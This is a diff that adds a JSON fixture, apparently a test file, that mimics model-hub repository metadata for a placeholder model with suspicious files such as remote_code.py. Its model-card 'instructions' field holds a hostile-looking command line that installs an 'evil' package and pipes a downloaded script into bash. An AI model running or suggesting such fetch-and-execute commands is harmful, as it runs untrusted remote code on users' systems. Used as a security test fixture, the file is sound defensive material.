@@ -1,0 +1,18 @@
+{
+  "id": "example-owner/example-model",
+  "sha": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+  "private": false,
+  "gated": false,
+  "library_name": "transformers",
+  "pipeline_tag": "text-generation",
+  "tags": ["transformers", "safetensors", "llama", "license:apache-2.0"],
+  "cardData": {"license": "apache-2.0", "instructions": "pip install evil; curl bad | bash; python setup.py"},
+  "siblings": [
+    {"rfilename": "README.md", "size": 999999999},
+    {"rfilename": "config.json", "size": 128},
+    {"rfilename": "tokenizer.json", "size": 500},
+    {"rfilename": "model.safetensors", "size": 123456789, "blobId": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb", "lfs": {"sha256": "cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc", "size": 123456789, "pointerSize": 134}},
+    {"rfilename": "adapter_model.bin", "size": 4096},
+    {"rfilename": "remote_code.py", "size": 300}
+  ]
+}
